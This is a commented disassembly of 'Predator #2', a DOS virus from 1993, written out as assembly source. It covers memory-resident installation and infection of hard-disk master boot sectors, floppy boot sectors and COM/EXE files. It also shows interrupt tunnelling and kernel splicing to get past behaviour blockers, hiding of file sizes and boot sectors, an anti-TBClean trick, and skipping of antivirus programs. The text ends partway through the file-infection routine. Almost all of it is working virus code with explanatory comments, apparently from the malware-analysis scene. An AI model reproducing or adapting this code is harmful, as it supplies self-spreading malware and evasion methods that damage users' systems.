; Predator #2 (Predator.2448) disasm.
; Multipartite semi-stealth polymorphic MBS/BS/COM/EXE.
; A very nicely written one.
; T-2000/IR, September - October 2000.


                .MODEL  TINY
                .CODE

START:
                PUSH    ES                      ; Save PSP.

                XOR     BP, BP                  ; We're starting from a file.

                MOV     AX, 50FDh               ; Virus' residency check.
                INT     13h

                CMP     AX, 0FD50h              ; Already installed?
                JE      Return_To_Host

                MOV     AX, ES                  ; Get our PSP.
                MOV     BX, AX

                DEC     AX                      ; Get our MCB.
                MOV     DS, AX

                MOV     AX, DS:[3]              ; Size of block.

                SUB     AX, 5984/16             ; Steal memory for virus.
                JC      Return_To_Host          ; Bail if it's too small.

                CMP     AH, 10h                 ; MCB must still have over
                JB      Return_To_Host          ; 64k of memory available.

                MOV     DS:[3], AX              ; Put back the new MCB size.

                ADD     AX, BX                  ; Get segment of the stolen
                                                ; memory.

                MOV     DS:[12h], AX            ; Adjust PSP DOS memory size.

                MOV     ES, AX                  ; ES = virus block.

                XOR     DI, DI                  ; Zero DS.
                MOV     DS, DI

                SUB     WORD PTR DS:[413h], 6   ; Adjust INT 12h DOS memory
                                                ; size.
		PUSH	CS
		POP	DS

                CALL    Get_Delta_1             ; Obtain virus' delta offset.
Get_Delta_1:    POP     SI
                SUB     SI, OFFSET Get_Delta_1

                MOV     CX, 5970/2              ; Copy virus to stolen memory
                CLD                             ; block. *** Copying way more
                REP     MOVSW                   ; than needed.

                MOV     AX, OFFSET Hook_Ints

                PUSH    ES                      ; Jump to relocated virus
                PUSH    AX                      ; copy in the stolen block.
                RETF

                DB      0, 'Predator virus #2  (c) 1993  Priest - Phalcon/Skism', 0

Return_To_Host:
                OR      BP, BP                  ; Running from file or boot?
                JZ      Jump_To_Host

                RETF                            ; If from boot then just RETF
                                                ; to the original boot.
Jump_To_Host:   CALL    Get_Delta_2
Get_Delta_2:    POP     SI
                ADD     SI, (Host_Word-Get_Delta_2)

		PUSH	CS
		POP	DS

                CLD                             ; Grab first original word
                LODSW                           ; of the host.

                CMP     AX, 'MZ'                ; Host is of .EXE type?
                JE      Jump_Host_EXE

                CMP     AX, 'ZM'                ; .EXE type?
                JE      Jump_Host_EXE           ; Else it's a .COM.

Jump_Host_COM:  POP     ES                      ; Restore original ES.

                MOV     DI, 100h
		PUSH	DI

                STOSW                           ; Restore .COM entrypoint.
                MOVSB

		POP	DI

		PUSH	ES
		POP	DS

                CALL    Anti_TBClean            ; Do an anti TBClean trick.

		PUSH	DS
		PUSH	DI

                XOR     AX, AX

                RETF                            ; Pass control back to host.

Jump_Host_EXE:  POP     AX                      ; Current PSP.
                MOV     BX, AX

                ADD     AX, (100h/16)           ; Plus size of PSP.

                ADD     [SI+2], AX              ; Add effective segment to
                                                ; host's CS.

                ADD     AX, [SI+6]              ; Same with SS.

                LES     DI, [SI]
                CALL    Anti_TBClean            ; Anti TBClean trick.

                CLI
                MOV     SS, AX                  ; Restore host's stack.
                MOV     SP, [SI+4]

                MOV     ES, BX                  ; Restore segment registers.
                MOV     DS, BX

                XOR     AX, AX
                STI

                JMP     DWORD PTR CS:[SI]       ; Pass control back to host.


; Make TBClean think the virus restored the host's original entrypoint
; while infact it has not, so TBCleaned files won't work.
Anti_TBClean:
		PUSH	AX
                PUSH    ES:[DI]                 ; Save original entrypoint
                                                ; bytes.
                ; Temporarily put a RETF there.

                MOV     BYTE PTR ES:[DI], 0CBh  ; RETF

                CALL    Get_Delta_3
Get_Delta_3:    POP     AX
                ADD     AX, (Return_To_Virus-Get_Delta_3)

		PUSH	CS
		PUSH	AX

                PUSH    ES                      ; Temporarily jump to host.
		PUSH	DI
		RETF


Return_To_Virus:
                POP     ES:[DI]                 ; Restore original entrypoint
                POP     AX                      ; byte, and AX.

		RETN


Hook_Ints:
		PUSH	CS
		POP	DS

                MOV     AL, 13h                 ; Save INT 13h first.
                MOV     DI, OFFSET Real_Int13h

                MOV     CX, 2

Get_Int_Loop:   CALL    Get_Int                 ; Fetch INT address.

                MOV     DX, ES

		PUSH	CS
		POP	ES

                XCHG    BX, AX

                CLC

Store_Int_Word: CLD                             ; Store offset/segment word.
                STOSW
                MOV     [DI+2], AX              ; Store it for a 2nd time.

                XCHG    DX, AX                  ; Swap offset & segment.

                CMC                             ; Looped 2 times yet?
                JC      Store_Int_Word          ; Else go again.

                ADD     DI, 4                   ; After the 2nd stored copy.

                DEC     CX                      ; Looped 3 times yet?
                JS      Hook_Int13h             ; Then we're done.

                MOV     AL, 21h                 ; Now save INT 21h.
                JNZ     Get_Int_Loop

                MOV     AL, 40h                 ; And after that, INT 40h.
                JMP     SHORT Get_Int_Loop

Hook_Int13h:    MOV     AL, 13h                 ; Hook INT 13h.
                MOV     DX, OFFSET Virus_Int13h
                CALL    Set_Int

                ; Generate JMP Virus_Seg:Virus_Offs.

                MOV     FAR_JMP, 0EAh
                MOV     FAR_JMP_IP, OFFSET Virus_Int21h
                MOV     FAR_JMP_CS, CS

                MOV     AH, 01h                 ; Get status of HDD's last
                MOV     DL, 80h                 ; operation.
                INT     13h

                OR      AH, AH                  ; If it was an error then
                JZ      Init_Variables          ; assume no HDD is present.

                ; INT 40h is only used when a harddisk is present,
                ; if none is, then just use INT 13h instead.

                MOV     SI, OFFSET Real_Int13h
                MOV     DI, OFFSET Real_Int40h
                MOVSW
                MOVSW
                MOVSW
                MOVSW

Init_Variables: MOV     Splice_Switch, 0C3h     ; Don't splice INT 21h.
                MOV     Check_DOS_load, 0       ; Check for DOS load.

                OR      BP, BP                  ; Running from a file?
                JNZ     Infect_HDD              ; Else go infect the HDD.

                ; Don't check for DOS loading.

                MOV     Check_DOS_load, (Chk_Boot_Read-Check_DOS_load)-1
                CALL    Tunnel_Ints

                ; Fetch address of DOS kernel.

                LDS     DI, DWORD PTR CS:Real_Int21h

                ; If the DOS kernel begins with a JMP FAR or INT 03h
                ; then instead of splicing INT 21h, hook it in the IVT.
                ; Probably to avoid clashing with other software that
                ; hooks INT 21h this way, like Novell.

                CMP     BYTE PTR [DI], 0EAh     ; JMP xxxx:xxxx ?
                JE      Hook_Int21h

                CMP     BYTE PTR [DI], 0CCh     ; INT 03h breakpoint?
                JE      Hook_Int21h

                ; Switch the INT 21h splicing back on.

                MOV     CS:Splice_Switch, 50h   ; PUSH AX
                CALL    Swap_JMP

                JMP     SHORT Infect_HDD

Hook_Int21h:    PUSH    CS
		POP	DS

                MOV     DX, OFFSET Virus_Int21h ; Hook INT 21h manually.
                MOV     AL, 21h
                CALL    Set_Int

Infect_HDD:     PUSH    CS
		PUSH	CS
		POP	ES
		POP	DS

                MOV     AX, 0201h               ; Read MBS of 1st HDD.
                MOV     BX, OFFSET Buffer
                MOV     CX, 1
                MOV     DX, 80h
                CALL    Do_Real_Int13h
                JC      JMP_Ret_Host

                CALL    Check_If_Infected       ; Is it already infected?
                JE      JMP_Ret_Host

                CALL    Crypt_Boot              ; Encrypt the MBS.
                CALL    Encrypt_Body            ; And the virus body.

                INC     CX                      ; Write original MBS/BS +
                MOV     AX, 0306h               ; virusbody starting at
                CALL    Do_Real_Int13h          ; sector 2 of the zero track.
                JC      JMP_Ret_Host

                CALL    Crypt_Boot              ; Decrypt the MBS back.
                CALL    Infect_Boot             ; Infect it.

                MOV     AX, 0301h               ; Write infected MBS back.
		DEC	CX
                CALL    Do_Real_Int13h

JMP_Ret_Host:   JMP     Return_To_Host


Check_If_Infected:

		PUSH	CX
		PUSH	SI
		PUSH	DI

                MOV     CX, 8                   ; Compare first 8 bytes of
                MOV     DI, OFFSET Buffer       ; MBS/BS with virus boot
                MOV     SI, OFFSET Boot_Loader  ; loader.
                CLD
                REPE    CMPSB

		POP	DI
		POP	SI
		POP	CX

		RETN


Infect_Boot:
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	DI
		PUSH	SI

                MOV     AX, -1                  ; Get a random initial
                CALL    Random_AX               ; encryption key.

                MOV     Init_Decr_Key, AX       ; Store it.

                INC     CX                      ; CX = start sector of body.

                MOV     Virus_Body_TS, CX
                AND     DL, 80h                 ; Either drive A: or C:
                                                ; *** This will fuck up the
                                                ; stealth if more than 1
                                                ; HDD/FDD is present.
                MOV     Virus_Body_HD, DX

                MOV     DI, OFFSET Buffer       ; Copy virus bootloader into
                MOV     SI, OFFSET Boot_Loader  ; bootsector.
                MOV     CX, Encrypted_Boot-Boot_Loader
                CLD
                REP     MOVSB

                XCHG    CX, AX                  ; CX = random encryption key.
                MOV     BX, ((Tunnel_Ints-Encrypted_Boot)+1)/2

Encrypt_Boot_L: LODSW                           ; Encrypt the bootloader.
                ROL     AX, CL
                STOSW

                ROL     CX, 1

		DEC	BX
                JNZ     Encrypt_Boot_L

		POP	SI
		POP	DI
		POP	DX
		POP	CX
		POP	BX
		POP	AX

		RETN


Crypt_Boot:
		PUSH	CX
		PUSH	DI
		PUSH	SI

                MOV     DI, OFFSET Buffer
                MOV     CX, 512/2

Crypt_Boot_W:   NOT     WORD PTR [DI]
		INC	DI
		INC	DI
                LOOP    Crypt_Boot_W

		POP	SI
		POP	DI
		POP	CX

		RETN

                ; I dunno what this is/does, perhaps
                ; another encrypted text?

                DB      090h, 0CAh, 0E4h, 0CAh, 040h, 0C6h
                DB      0DEh, 0DAh, 0CAh, 0E6h, 040h, 0E8h
                DB      0D0h, 0CAh, 040h, 0A0h, 0E4h, 0CAh
                DB      0C8h, 0C2h, 0E8h, 0DEh, 0E4h, 042h


Encrypt_Body:
		PUSH	CX
		PUSH	DI
                PUSH    SI

                MOV     CX, (2448-22)/2
                MOV     DI, OFFSET Buffer+512
                XOR     SI, SI
                CLD

Encrypt_Virus:  LODSW                           ; Fetch word from virusbody.
                ROR     AX, CL                  ; Encrypt it.
                STOSW                           ; Put it in the buffer.
                LOOP    Encrypt_Virus           ; Do the whole virusbody.

		POP	SI
		POP	DI
		POP	CX

		RETN


Boot_Loader:
                CLI
                MOV     DI, 7C00h+(Encrypted_Boot-Boot_Loader)
                MOV     AX, ((Tunnel_Ints-Encrypted_Boot)+1)/2
                MOV     CX, 0
Init_Decr_Key   =       WORD PTR $-2

Decrypt_Boot:   ROR     WORD PTR CS:[DI], CL
                ROL     CX, 1

		INC	DI
		INC	DI

		DEC	AX
                JNZ     Decrypt_Boot

Encrypted_Boot: MOV     SS, AX                  ; Set up a stack.
                MOV     SP, 0FFFEh
                STI

                MOV     DS, AX                  ; DS = IVT.
                MOV     BX, AX

                SUB     WORD PTR DS:[413h], 6   ; Steal 6k of DOS memory to
                                                ; hide in.

                INT     12h                     ; Get new memory count.

                MOV     CL, (16-6)              ; Calculate segment to hide
                ROR     AX, CL                  ; in (anti-heuristic).

                MOV     ES, AX
                XCHG    BP, AX

                MOV     AX, 0205h               ; Read virusbody off disk.
                MOV     CX, 0
Virus_Body_TS   =       WORD PTR $-2
                MOV     DX, 0
Virus_Body_HD   =       WORD PTR $-2
		PUSH	AX
		PUSH	CX
                INT     13h
                JNC     Go_Decr_Body

                INT     18h                     ; ROM BASIC.

Go_Decr_Body:   MOV     DI, BX
                MOV     CX, (2448-22)/2

Decrypt_Body:   ROL     WORD PTR ES:[DI], CL    ; Decrypt virusbody.
		INC	DI
		INC	DI
                LOOP    Decrypt_Body

                MOV     ES, BX
                MOV     DI, 7C00h-(Tunnel_Ints-Relocator)
                MOV     CX, Encrypted_Boot-Boot_Loader
                MOV     SI, 7C00h+(Relocator-Boot_Loader)
                CLD
                REP     MOVSB

                MOV     [DI-2], BP              ; Put virus segment in
                                                ; relocator.

                POP     CX                      ; CX = startsector of virus.
                POP     AX                      ; AX = 0205h.

                MOV     AL, 1                   ; 1 sector.
                MOV     BX, DI                  ; BX = 7C00h.
                DEC     CX                      ; CX = original MBS/BS.

                ; Now jump to the relocator just before 7C00h.

                JMP     SHORT Boot_Loader-(Tunnel_Ints-Relocator)


Relocator:
                INT     13h                     ; Read the original encrypted
                JNC     Go_Decr_7C00h           ; MBS/BS.

                INT     18h                     ; On error call ROM BASIC.

Go_Decr_7C00h:  MOV     CX, 512/2

Decrypt_7C00h:  NOT     WORD PTR [DI]           ; Decrypt the original MBS/BS
                INC     DI                      ; right in front of us.
		INC	DI
                LOOP    Decrypt_7C00h

                DB      9Ah                     ; CALL xxxx:xxxx opcode,
                DW      OFFSET Hook_Ints, 0     ; (pushes 0:7C00h on stack).


Tunnel_Ints:
                MOV     AH, 52h                 ; Get MS-DOS's internal list
                INT     21h                     ; of lists.

                MOV     AX, ES:[BX-2]           ; Save segment of 1st MCB.
                MOV     Start_MCB, AX

                MOV     AL, 01h                 ; Save original INT 01h.
                CALL    Get_Int

		PUSH	BX

                MOV     DX, OFFSET Virus_Int01h ; Install own INT 01h
                CALL    Set_Int                 ; handler.

                MOV     Tunnel_Mode, 0          ; Tunnel INT 13h.

                PUSHF                           ; Set the TF.
		POP	BX
                OR      BH, 01h
		PUSH	BX
                POPF

                MOV     AH, 01h                 ; Tunnel dummy function.
                CALL    Do_Real_Int13h

                MOV     Tunnel_Mode, 1          ; Tunnel INT 21h.

                PUSH    BX                      ; Set TF again.
                POPF

                MOV     AH, 30h                 ; Tunnel dummy function.
                CALL    Do_Real_Int21h

                MOV     Tunnel_Mode, 2          ; Tunnel INT 40h.

		PUSH	BX
                POPF

                MOV     AH, 01h                 ; Tunnel dummy function.
                CALL    Do_Real_Int40h

                AND     BH, NOT 01h             ; Disable TF just in case
                PUSH    BX                      ; the original entrypoints
                POPF                            ; were not found.

		POP	DX

		PUSH	ES
		POP	DS

                MOV     AL, 01h                 ; Restore original INT 01h.
                CALL    Set_Int

		RETN


Virus_Int01h:
                PUSH    BP
                MOV     BP, SP

		PUSH	AX
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     AX, [BP+(2*2)]          ; CS of current instruction.

                CMP     Tunnel_Mode, 1          ; Tunneling INT 21h ?
                JNE     Chk_Int13h_Tun

                CMP     AX, Start_MCB           ; We're in the DOS kernel?
                JA      Exit_Int01h

                MOV     Real_Int21h+2, AX       ; Save tunneled address.
                MOV     AX, [BP+(1*2)]
                MOV     Real_Int21h, AX

                ; Disable the TF in the stack.

Disable_TF:     AND     WORD PTR [BP+6], NOT 0100h

Exit_Int01h:    POP     DS
		POP	AX
		POP	BP

                IRET

Chk_Int13h_Tun: CMP     Tunnel_Mode, 2          ; Tunneling INT 13h/40h ?
                JA      Chk_Step_Count          ; Nope, then go step.

                CMP     AX, 0C800h              ; Below diskcontroller code?
                JB      Exit_Int01h             ; (INT 13h of old XT's).

                CMP     AX, 0F000h              ; Above standard
                JA      Exit_Int01h             ; diskcontroller code?

		PUSH	DI
                MOV     DI, OFFSET Real_Int13h

                CMP     Tunnel_Mode, 0          ; Tunneling INT 13h ?
                JZ      Store_Disk_Int

                ADD     DI, (Real_Int40h-Real_Int13h)

Store_Disk_Int: MOV     [DI+2], AX              ; Save tunneled address.
                MOV     AX, [BP+(1*2)]
                MOV     [DI], AX

		POP	DI
                JMP     SHORT Disable_TF

Chk_Step_Count: DEC     Step_Count              ; IP is far away enough of
                JNZ     Exit_Int01h             ; JMP_Virus_ISR zone ?

                CALL    Swap_JMP                ; Then swap the JMP back in.

                MOV     AL, 01h                 ; Restore original INT 01h.
		PUSH	DX
                LDS     DX, DWORD PTR Old_Int01h
                CALL    Set_Int

		POP	DX
                JMP     SHORT Disable_TF


; This swaps a JMP_Virus_ISR in and out the DOS kernel, this technique
; is used to evade behaviour blockers that monitor the IVT for hooks.
Swap_JMP:

Splice_Switch   DB      0
                PUSH    CX
                PUSH    DI
		PUSH	SI
		PUSH	DS
		PUSH	ES
                PUSHF

		PUSH	CS
		POP	DS

                MOV     SI, OFFSET FAR_JMP
                LES     DI, DWORD PTR Real_Int21h

                MOV     CX, 5

                CLD

Swap_Byte:      LODSB                           ; Swap 5 bytes.
                XCHG    ES:[DI], AL
                MOV     [SI-1], AL
		INC	DI
                LOOP    Swap_Byte

                POPF
		POP	ES
		POP	DS
		POP	SI
		POP	DI
		POP	CX
		POP	AX

		RETN


Get_Int:
		PUSH	AX
		PUSH	DS

                CBW                             ; Clear AH.
                SHL     AX, 1                   ; INT # MUL 4.
                SHL     AX, 1

                XCHG    BX, AX

                XOR     AX, AX                  ; DS = IVT.
                MOV     DS, AX

                LES     BX, [BX]                ; Get INT address in ES:BX.

		POP	DS
		POP	AX

		RETN



Set_Int:
		PUSH	AX
		PUSH	BX
		PUSH	DS
		PUSH	ES

                CBW                             ; Clear AH.
                SHL     AX, 1                   ; INT # MUL 4.
                SHL     AX, 1
                XCHG    BX, AX

                XOR     AX, AX                  ; ES = IVT.
                MOV     ES, AX

                MOV     ES:[BX], DX             ; Set the new address.
                MOV     ES:[BX+2], DS

		POP	ES
		POP	DS
		POP	BX
		POP	AX

		RETN

                ; XOR 0FFh encrypted: 'THE PREDATOR'.

                DB      0ABh, 0B7h, 0BAh, 0DFh, 0AFh, 0ADh
                DB      0BAh, 0BBh, 0BEh, 0ABh, 0B0h, 0ADh

Virus_Int13h:
                DB      0EBh                    ; JMP SHORT opcode.
Check_DOS_load  DB      0

                CALL    Push_All

                MOV     AL, 21h                 ; Get INT 21h.
                CALL    Get_Int

                PUSH    CS
                POP     DS

                MOV     DI, OFFSET Real_Int21h

                CMP     [DI], BX                ; Has it changed since the
                JNE     Check_DOS_Seg           ; virus took it?

Exit_DOS_Check: CALL    Pop_All
                JMP     SHORT Chk_Boot_Read

Check_DOS_Seg:  MOV     AX, ES

		PUSH	CS
		POP	ES

                CMP     AX, 800h                ; DOS has hooked it yet?
                JA      Exit_DOS_Check

                CLD
                CLC

Store_DOS_Addr: XCHG    BX, AX                  ; Save INT 21h address.
                STOSW

                MOV     [DI+2], AX

                CMC                             ; Store two copies of
                JC      Store_DOS_Addr          ; INT 21h.

                MOV     Check_DOS_load, (Chk_Boot_Read-Check_DOS_load)-1

                MOV     AL, 21h                 ; Manually hook INT 21h.
                MOV     DX, OFFSET Virus_Int21h
                CALL    Set_Int

                JMP     SHORT Exit_DOS_Check

Chk_Boot_Read:  CMP     AH, 02h                 ; Sector read?
                JNE     Check_TSR_Mark

                CMP     CX, 1                   ; It's the MBS/BS ?
                JNE     Check_TSR_Mark

                CMP     DH, 0                   ; Head zero?
                JZ      Do_Boot_Read

Check_TSR_Mark: CMP     AX, 50FDh               ; Virus' residency check?
                JNE     JMP_Old_Int13h

                MOV     AX, 0FD50h              ; Return marker.

Do_RETF_2:      RETF    2                       ; Return to caller.

JMP_Old_Int13h: JMP     DWORD PTR CS:Old_Int13h ; JMP to previous ISR.

Do_Boot_Read:   CALL    Do_Old_Int13h           ; Carry out the read.
                JC      Do_RETF_2               ; Bail on error.

                CALL    Push_All

                MOV     DI, OFFSET Buffer

		PUSH	ES
		PUSH	CS
		POP	ES
		POP	DS

                MOV     SI, BX                  ; Copy read MBS/BS to buffer.
                MOV     CX, 512/2
                CLD
                REP     MOVSW

		PUSH	DS

		PUSH	CS
		POP	DS

                CALL    Check_If_Infected       ; Is it infected?

		POP	ES

                JNE     Check_If_HDD            ; If not, then infect if it
                                                ; it's a floppy disk.

                ; Else stealth it.

                MOV     DI, OFFSET Buffer+(Encrypted_Boot-Boot_Loader)
                MOV     CX, [DI-(Encrypted_Boot-Init_Decr_Key)]
                MOV     AX, ((Tunnel_Ints-Encrypted_Boot)+1)/2

Decr_Loader:    ROR     WORD PTR [DI], CL       ; Decrypt bootloader to get
                ROL     CX, 1                   ; the stored location of the
                                                ; original MBS/BS.
		INC	DI
		INC	DI

		DEC	AX
                JNZ     Decr_Loader

                CALL    Pop_All

		PUSH	BX
		PUSH	CX
		PUSH	DX

                ; Read original encrypted MBS/BS.

                MOV     AX, 0201h
                MOV     CX, CS:[(Buffer-START)+(Virus_Body_TS-Boot_Loader)]
                MOV     DH, CS:[(Buffer-START)+(Virus_Body_HD-Boot_Loader)+1]
		DEC	CX
                CALL    Do_Disk_Int

                PUSHF

                MOV     CX, 512/2

Decr_Real_Boot: NOT     WORD PTR ES:[BX]        ; Decrypt original MBS/BS.
		INC	BX
		INC	BX
                LOOP    Decr_Real_Boot

                POPF
		POP	DX
		POP	CX
		POP	BX
                JMP     SHORT Do_RETF_2

Pop_All_RETF_2: CALL    Pop_All

                JMP     SHORT Do_RETF_2

Check_If_HDD:   CMP     DL, 80h                 ; Stealth floppies/harddisks
                JAE     Pop_All_RETF_2          ; but only infect floppies.

		PUSH	CS
		POP	ES

                MOV     SI, DX

                MOV     DI, OFFSET Buffer

                ; Now calculate the floppy disk's last
                ; track and write the virus there.

                MOV     AX, [DI+18h]            ; Sectors per track.
                SUB     [DI+13h], AX            ; Steal 1 track from total
                                                ; sector count.

                MOV     CX, AX                  ; Get original sector count.
                ADD     AX, [DI+13h]

                OR      AX, AX                  ; Test for validity.
                JZ      Pop_All_RETF_2

                JCXZ    Pop_All_RETF_2          ; Test for validity.

                XOR     DX, DX                  ; Calculate total amount of
                DIV     CX                      ; tracks.

                OR      DX, DX                  ; Test for validity.
                JNZ     Pop_All_RETF_2

                MOV     BX, [DI+1Ah]            ; Number of heads.

                OR      BX, BX                  ; Test for validity.
                JZ      Pop_All_RETF_2

                DIV     BX                      ; Calculate amount of tracks
                                                ; per head.

                OR      DX, DX                  ; Test for validity again.
                JNZ     Pop_All_RETF_2

                MOV     DX, SI                  ; DX = head/drive.

                DEC     BX                      ; Last head, starting with 0.
                MOV     DH, BL

                DEC     AX                      ; Last track, starting with
                MOV     CH, AL                  ; 0.

                MOV     CL, 1                   ; Starting from sector 1.
                MOV     BX, DI                  ; BX = offset Buffer.

                CALL    Crypt_Boot              ; Encrypt original BS.
                CALL    Encrypt_Body

                MOV     AX, 0306h               ; Write original MBS/BS +
                MOV     BX, OFFSET Buffer       ; virus body to floppy.
                CALL    Do_Real_Int40h
                JC      Pop_All_RETF_2

                CALL    Crypt_Boot              ; Decrypt original BS back.
                CALL    Infect_Boot             ; Infect it.

                MOV     AX, 0301h               ; Write infected bootsector.
                MOV     CX, 1
                XOR     DH, DH
                CALL    Do_Real_Int40h

                CALL    Pop_All

                PUSHF                           ; Save flags and status byte.
		PUSH	AX

                ; Stealth the total sector count in the read
                ; bootsector that wasn't stealthed yet.

                MOV     AX, ES:[BX+18h]         ; Total sectors per track.
                SUB     ES:[BX+13h], AX         ; Total sector count.

		POP	AX
                POPF
                JMP     Do_RETF_2


Virus_Int21h:
                CALL    Swap_JMP                ; Remove JMP from DOS-kernel.

                CALL    Push_All

                MOV     AL, 01h                 ; Get original INT 01h.
                CALL    Get_Int

		PUSH	CS
		POP	DS

                MOV     Old_Int01h, BX          ; And save it.
                MOV     Old_Int01h+2, ES

                ; Initialize to not let the tracer swap back the JMP.

                MOV     Trace_Swap, (Swap_JMP_Back-Trace_Swap)-1

                CALL    Pop_All

                CMP     AH, 11h                 ; Findfirst (FCB) ?
                JE      Do_FCB_Stealth

                CMP     AH, 12h                 ; Findnext (FCB) ?
                JNE     Check_Txt_St

Do_FCB_Stealth: CALL    Do_Old_Int21h           ; Do the call.

                CALL    Push_All

                OR      AL, AL                  ; Success?
                JNZ     Exit_FCB_St

                MOV     BX, DX                  ; Get drive from FCB.
                MOV     CL, [BX]

                MOV     AH, 2Fh                 ; Get current DTA.
                CALL    Do_Real_Int21h

                INC     CL                      ; It's an extended FCB ?
                JNZ     Check_FCB_Date

                ADD     BX, 7                   ; Then skip extended shit.

                ; Years are >= 2080 ? Then it's infected.

Check_FCB_Date: CMP     BYTE PTR ES:[BX+1Ah], 0C8h
                JB      Exit_FCB_St

                ; Restore original year field.

                SUB     BYTE PTR ES:[BX+1Ah], 0C8h

                ; Restore original filesize.

                SUB     WORD PTR ES:[BX+1Dh], 2448
                SBB     WORD PTR ES:[BX+1Dh+2], 0

Exit_FCB_St:    JMP     Exit_Int21h

Check_Txt_St:   CMP     AH, 4Eh                 ; Findfirst (ASCIIZ) ?
                JE      Do_Txt_Stealth

                CMP     AH, 4Fh                 ; Findnext (ASCIIZ) ?
                JNE     Enable_Trace_S

Do_Txt_Stealth: CALL    Do_Old_Int21h
                CALL    Push_All

                MOV     AH, 2Fh                 ; Obtain current DTA.
                CALL    Do_Real_Int21h

                ; Years are >= 2080 ? Then it's infected.

                CMP     BYTE PTR ES:[BX+19h], 0C8h
                JB      Exit_Txt_St

                ; Restore original year field.

                SUB     BYTE PTR ES:[BX+19h], 0C8h

                ; Restore original filesize.

                SUB     WORD PTR ES:[BX+1Ah], 2448
                SBB     WORD PTR ES:[BX+1Ah+2], 0

Exit_Txt_St:    JMP     Exit_Int21h

Enable_Trace_S: MOV     CS:Trace_Swap, 0        ; All the other calls could
                                                ; possibly not return to the
                                                ; caller, so enable tracer.
                CALL    Push_All

                CMP     AH, 3Dh                 ; File open?
                JE      Set_New_Int24h

                CMP     AH, 4Bh                 ; File execute?
                JE      Check_For_Exec

                CMP     AH, 6Ch                 ; Extended file open?
                JNE     Exit_Int21h

                TEST    CL, 00000100b           ; Don't infect system files.
                JNZ     Exit_Int21h

                MOV     DX, SI                  ; DS:DX = path.
                JMP     SHORT Set_New_Int24h

Check_For_Exec: OR      AL, AL                  ; Only infect on execute.
                JNZ     Exit_Int21h

Set_New_Int24h: PUSH    DX
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     AL, 24h                 ; Save original INT 24h.
                CALL    Get_Int

                MOV     DX, OFFSET Virus_Int24h ; Install dummy critical
                CALL    Set_Int                 ; error handler.

		POP	DS
		POP	DX

		PUSH	AX
		PUSH	BX
		PUSH	ES

                CALL    Check_File_Name         ; Don't infect several AV's.
                JC      Restore_Int24h

                MOV     AX, 4300h               ; Get file's attributes.
                CALL    Do_Real_Int21h
                JC      Restore_Int24h

                TEST    CL, 00000100b           ; Can't be a system file.
                JNZ     Restore_Int24h

                MOV     AX, 4301h

                PUSH    AX                      ; Save file's attributes for
                PUSH    CX                      ; later.
		PUSH	DX
		PUSH	DS

                XOR     CX, CX                  ; Blank file's attributes.
                CALL    Do_Real_Int21h
                JC      Restore_Attr

                MOV     AX, 3D02h               ; Open the file.
                CALL    Do_Real_Int21h
                JC      Restore_Attr

                XCHG    BX, AX                  ; BX = file handle.

		PUSH	CS
		POP	DS

                MOV     AX, 5700h               ; Get file date & time.
                INT     21h
                JC      Close_File

                CMP     DH, 0C8h                ; File is already infected?
                JAE     Close_File              ; (year field >= 2080).

		PUSH	CX
		PUSH	DX

                CALL    Infect_File

		POP	DX
		POP	CX
                JC      Close_File

                ADD     DH, 0C8h                ; Restore original time and
                MOV     AX, 5701h               ; date stamp with 100 years
                CALL    Do_Real_Int21h          ; added.

Close_File:     MOV     AH, 3Eh                 ; Close the file.
                CALL    Do_Real_Int21h

Restore_Attr:   POP     DS                      ; Restore file attributes.
		POP	DX
		POP	CX
		POP	AX
                CALL    Do_Real_Int21h

Restore_Int24h: POP     DS                      ; Restore original INT 24h.
		POP	DX
		POP	AX
                CALL    Set_Int

Exit_Int21h:    CALL    Pop_All                 ; Restore registers.

                DB      0EBh                    ; JMP SHORT opcode.
Trace_Swap      DB      0

                CALL    Push_All

		PUSH	CS
		POP	DS

                MOV     Tunnel_Mode, 3          ; JMP swap trace mode.

                MOV     Step_Count, 5           ; Swap JMP back after five
                                                ; instructions have executed.
                                                ; *** This should be 6, cause
                                                ; the JMP INT 21h later on
                                                ; is traced aswell, so when
                                                ; the DOS kernel starts with
                                                ; 5 1-byte instructions, the
                                                ; JMP will be swapped in too
                                                ; early.

                MOV     AL, 01h                 ; Hook tracer up.
                MOV     DX, OFFSET Virus_Int01h
                CALL    Set_Int

                CALL    Pop_All

		PUSH	AX

                PUSHF                           ; Enable TF.
		POP	AX
                OR      AH, 01h
		PUSH	AX
                POPF

		POP	AX

                ; Start single stepping through INT 21h and
                ; swap the JMP back in after 5 instructions.

                JMP     DWORD PTR CS:Real_Int21h

Swap_JMP_Back:  CALL    Swap_JMP

                RETF    2


Infect_File:
                MOV     AH, 3Fh                 ; Read file's header.
                MOV     CX, 24
                MOV     DX, OFFSET File_Header
                CALL    Do_Real_Int21h
                JC      Bad_Infect

                SUB     CX, AX                  ; All bytes were read?
                JNZ     Bad_Infect

                MOV     SI, DX                  ; SI = file header.

                MOV     AX, 4202h               ; Get file length.
                CWD
                CALL    Do_Real_Int21h

                XCHG    CX, AX                  ; Lower word of filesize.

                CLD                             ; Save first word of host.
                LODSW
                MOV     Host_Word, AX

                CMP     AX, 'ZM'                ; File is EXE type?
                JE      Go_Infect_Hdr

                CMP     AX, 'MZ'                ; File is EXE type?
                JE      Go_Infect_Hdr

                OR      DI, DI                  ; If extension is '.COM' DI
                JNZ     Bad_Infect              ; will be zero.

                OR      DX, DX                  ; .COM can't be bigger than
                JNZ     Bad_Infect              ; 64k in length.

                CMP     CX, 0-(2448+1000)       ; Don't infect .COM's too big
                JA      Bad_Infect              ; in length either.

                CMP     CX, 1000                ; Nor too small.
                JB      Bad_Infect

                MOV     AL, [SI]                ; Save 3rd byte of host.
                MOV     BYTE PTR Host_IP, AL

                SUB     CX, 3                   ; Calculate displacement.

                MOV     BYTE PTR [SI-2], 0E9h   ; Replace entrypoint with
                MOV     [SI-1], CX              ; a JMP to the virus code.

                ADD     CX, 100h+3              ; Save runtime delta offset
                XCHG    CX, AX                  ; in AX for poly engine.

                JMP     SHORT Write_Virus

Go_Infect_Hdr:  CALL    Infect_EXE_Header

Write_Virus:    PUSH    CS
		POP	ES

                CALL    Poly_Engine             ; Polymorphic encrypt virus.

                MOV     AH, 40h                 ; Append virus to host.
                MOV     CX, 2448
                MOV     DX, OFFSET Buffer+512
                CALL    Do_Real_Int21h
                JC      Bad_Infect

                SUB     CX, AX                  ; All bytes were written?
                JNZ     Bad_Infect

                MOV     AX, 4200h               ; Seek to file header.
                CWD
                CALL    Do_Real_Int21h
